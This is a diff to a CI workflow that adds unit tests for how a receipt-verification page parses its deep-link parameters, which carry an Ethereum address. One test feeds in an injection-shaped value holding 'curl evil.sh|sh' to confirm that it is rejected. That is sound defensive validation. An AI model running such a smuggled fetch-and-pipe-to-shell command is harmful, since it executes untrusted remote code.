@@ -179,10 +179,28 @@ jobs:
           const m = html.match(/\/\/ ---- CORE BEGIN ----[^\n]*\n([\s\S]*?)\/\/ ---- CORE END ----/);
           if (!m) { console.error('CORE block not found in receipt.html'); process.exit(1); }
           globalThis.ethers = { verifyMessage };
-          const core = new Function(m[1] + '; return { verifyReceipt, verKey, sortVersionedDesc };')();
+          const core = new Function(m[1] + '; return { verifyReceipt, verKey, sortVersionedDesc, parseParams };')();
           const good = fs.readFileSync(REPO + '/proofs/v0.4-source.md', 'utf8');
           let fails = 0;
           const T = (n, c, d) => { console.log((c ? 'PASS' : 'FAIL') + ' | ' + n + (d && !c ? ' | ' + d : '')); if (!c) fails++; };
+          // deep-link param parsing (c14: ?load=latest&require=0x… — URL is untrusted input)
+          {
+            const pp = (q) => core.parseParams(new URLSearchParams(q));
+            let d = pp('load=latest&require=0xf232Dcdc177b53981b4D805A48C79F239DB8D0F9');
+            T('params: load=latest + valid require', d.load === true && d.require === '0xf232Dcdc177b53981b4D805A48C79F239DB8D0F9' && d.badRequire === false, JSON.stringify(d));
+            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9');
+            T('params: require only, no load', d.load === false && d.require === '0xf232dcdc177b53981b4d805a48c79f239db8d0f9', JSON.stringify(d));
+            d = pp('require=0x123');
+            T('params: short require rejected as badRequire', d.require === '' && d.badRequire === true, JSON.stringify(d));
+            d = pp('require=0xzz32dcdc177b53981b4d805a48c79f239db8d0f9');
+            T('params: non-hex require rejected', d.require === '' && d.badRequire === true, JSON.stringify(d));
+            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9;curl evil.sh|sh');
+            T('params: injection-shaped require rejected', d.require === '' && d.badRequire === true, JSON.stringify(d));
+            d = pp('load=1');
+            T('params: load!=latest ignored', d.load === false, JSON.stringify(d));
+            d = pp('');
+            T('params: empty query is no-op', d.load === false && d.require === '' && d.badRequire === false, JSON.stringify(d));
+          }
           // version-sort unit tests (c13: loadSample resolves tags/files by these)
           {
             const sv = core.sortVersionedDesc(['v0.4-a.md', 'v0.10-a.md', 'v0.9-a.md', 'v0.10.2-a.md', 'fixture-no-ver.md']);
